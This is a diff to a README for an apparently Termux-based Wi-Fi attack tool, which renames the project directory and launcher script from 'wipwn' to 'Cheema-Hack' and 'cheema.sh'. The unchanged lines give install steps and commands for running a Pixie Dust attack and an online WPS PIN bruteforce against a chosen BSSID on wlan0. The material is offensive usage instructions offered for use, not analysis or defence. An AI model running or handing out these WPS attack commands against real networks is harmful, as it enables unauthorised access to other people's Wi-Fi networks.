@@ -16,7 +16,7 @@ pkg update && pkg upgrade -y
 pkg install root-repo -y
 pkg install git tsu python wpa-supplicant pixiewps iw -y
 git clone https://github.com/Rafiqahmedcheema/Cheema-Hack
-cd wipwn
+cd Cheema-Hack
 chmod +x main.py
 ```
 
@@ -29,7 +29,7 @@ chmod +x main.py
 + **Turn on Location.**
 - Show avaliable networks and start Pixie Dust attack on a specified network.
 - ```sudo python main.py -i wlan0 -K```
-- ```bash wipwn.sh```
+- ```bash cheema.sh```
 - - Start Pixie Dust attack on a specified BSSID:
 `sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
 - Launch online WPS bruteforce with the specified first half of the PIN:
